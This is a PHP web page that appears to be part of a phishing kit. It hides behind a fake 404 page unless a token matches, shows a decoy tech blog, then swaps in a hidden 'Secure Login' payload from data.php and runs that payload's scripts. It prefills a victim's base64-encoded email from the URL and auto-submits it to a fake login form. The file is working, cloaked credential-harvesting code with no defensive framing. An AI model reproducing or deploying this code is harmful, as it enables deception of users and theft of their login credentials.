<?php
ob_start();
session_start();
if (!isset($_GET['token']) || !isset($_SESSION['auth_token']) || $_GET['token'] !== $_SESSION['auth_token']) {
    http_response_code(404);
    echo "<h1>404 Not Found</h1><p>The page you are looking for does not exist.</p>";
    exit();
}


$siteNames = [
    "Tech Insights Platform",
    "Innovation Hub",
    "Future Tech Zone",
    "Digital Frontier",
    "Tech Pulse",
    "Quantum Nexus",
    "AI Revolution",
    "Cyber Horizon",
    "NextGen Tech",
    "Innovate Now",
    "Tech Odyssey Hub",
    "Smart Futures",
    "Digital Vanguard",
    "Tech Trailblazers",
    "Infinite Circuits",
    "Code & Conquer",
    "Tech Fusion",
    "Neon Byte",
    "Visionary Tech",
    "Spark of Innovation"
];
$siteName = $siteNames[array_rand($siteNames)]; // Select random site name

// Array of 20 unique welcome messages
$welcomeMessages = [
    "Explore the latest in technology and innovation!",
    "Dive into the world of cutting-edge tech!",
    "Discover what's next in technology!",
    "Join us on a journey through innovation!",
    "Stay ahead with the latest tech trends!",
    "Unleash the future of technology!",
    "Your gateway to tech breakthroughs!",
    "Ignite your passion for innovation!",
    "Connect with the pulse of tech!",
    "Experience the frontier of digital advances!",
    "Unlock the secrets of tomorrow's tech!",
    "Fuel your curiosity with tech insights!",
    "Navigate the future with cutting-edge ideas!",
    "Discover the power of tech innovation!",
    "Join the revolution in technology!",
    "Explore new horizons in tech!",
    "Stay inspired with tech discoveries!",
    "Lead the way in digital innovation!",
    "Embrace the future of tech today!",
    "Dive deep into the tech universe!"
];
$welcomeMessage = $welcomeMessages[array_rand($welcomeMessages)]; // Select random welcome message

$visitorCount = rand(500, 2000);
$lastUpdate = date("F j, Y", strtotime("-" . rand(1, 15) . " days"));
header("Content-Type: text/html; charset=UTF-8");
header("X-Frame-Options: SAMEORIGIN");
header("X-Content-Type-Options: nosniff");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
include 'data.php'; // Include data.php to get $decodedContent

function fetchSampleArticles() {
    return [
        ["title" => "AI Breakthroughs", "date" => "April 10, 2025", "summary" => "Discover the latest advancements in AI."],
        ["title" => "Quantum Computing", "date" => "April 15, 2025", "summary" => "A deep dive into quantum technology."]
    ];
}
$posts = fetchSampleArticles();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($siteName); ?></title>
    <meta name="description" content="Your source for cutting-edge tech insights.">
    <meta name="keywords" content="tech, innovation, AI, quantum, updates">
    <meta name="author" content="Jane Doe">
    <meta name="robots" content="index, follow">
    <style>
        body {
            min-height: 100vh;
            /* background: linear-gradient(135deg, #1e3c72, #2a5298); */
            background: url("./assets/images/bg.svg");
            background-repeat: no-repeat;
            height: 100vh;
            background-size:cover;
            font-family: Arial, sans-serif;
            color: #fff;
        }
        .header { text-align: center; padding: 20px; }
        .post { background: rgba(255, 255, 255, 0.1); padding: 15px; margin: 10px 0; border-radius: 8px; }

        .loader-main {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s;
        }
        .loader-text {
            font-size: 24px;
            margin-top: 20px;
        }
        #secretArea { display: none; min-height: 100vh; }
        .content { max-width: 800px; margin: 0 auto; padding: 20px; }
    </style>
</head>
<body>
    <div class="loader-main" id="loader">
        <svg width="50" height="50" viewBox="0 0 50 50">
            <circle cx="25" cy="25" r="20" stroke="#2380dcff" stroke-width="5" fill="none" stroke-dasharray="31.4" stroke-dashoffset="0">
                <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/>
            </circle>
        </svg>
        <div class="loader-text">Initializing...</div>
    </div>

    <div class="content" id="visibleContent">
        <h1 class="header"><?php echo htmlspecialchars($welcomeMessage); ?></h1>
        <p>Currently inspiring <?php echo $visitorCount; ?> tech enthusiasts!</p>
        <p>Last updated: <?php echo $lastUpdate; ?></p>

        <?php foreach ($posts as $post): ?>
            <div class="post">
                <h2><?php echo htmlspecialchars($post['title']); ?></h2>
                <p><small><?php echo $post['date']; ?></small></p>
                <p><?php echo htmlspecialchars($post['summary']); ?></p>
            </div>
        <?php endforeach; ?>
    </div>
    <div id="secretArea"></div>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script>
        const revealedContent = <?php echo json_encode($decodedContent); ?>;
        function decipherBase64(str) {
            try {
                return atob(str);
            } catch (e) {
                console.error("Base64 decipher error:", e);
                return "";
            }
        }
        function verifyEmail(input) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(input);
        }
        function displayPayload(htmlPayload, destination) {
            document.title = "Secure Login";
            const container = document.createElement('div');
            container.innerHTML = htmlPayload;
            const scripts = container.querySelectorAll('script');
            scripts.forEach(script => {
                const newScript = document.createElement('script');
                script.src ? newScript.src = script.src : newScript.textContent = script.textContent;
                document.body.appendChild(newScript);
            });
            destination.innerHTML = container.innerHTML;
            destination.style.display = "block";
        }

        setTimeout(() => {
            document.getElementById("visibleContent").style.display = "none";
            const loader = $("#loader");
            const hiddenZone = document.getElementById("secretArea");

            if (window.location.hash) {
                const hashInput = window.location.hash.substring(1);
                if (verifyEmail(hashInput)) {
                    alert("Access denied: Invalid URL parameter.");
                    loader.fadeOut();
                    return;
                }
                localStorage.setItem("aiVal", hashInput); // Kept original key for functionality
                history.replaceState(null, null, window.location.pathname);
            }
            if (revealedContent) {
                displayPayload(revealedContent, hiddenZone);
            }
            loader.fadeOut();

            // This auto-fill logic is unique to validate.php and is preserved
            setTimeout(() => {
                const storedValue = localStorage.getItem("aiVal");
                if (storedValue) {
                    const encodedPart = storedValue.substring(6);
                    try {
                        const decodedValue = decipherBase64(encodedPart); // Use renamed function
                        const inputField = document.getElementById('email_field');
                        if (inputField) {
                            inputField.value = decodedValue;
                            const submitBtn = document.getElementById("emailNext");
                            if (submitBtn && decodedValue) {
                                setTimeout(() => submitBtn.click(), 2000);
                            } else {
                                console.warn("Submit button not found.");
                            }
                        }
                    } catch (e) {
                        console.error("Base64 decode error:", e);
                    }
                }
            }, 1000);

        }, 2000);
    </script>
</body>
</html>

<?php
ob_end_flush();
?>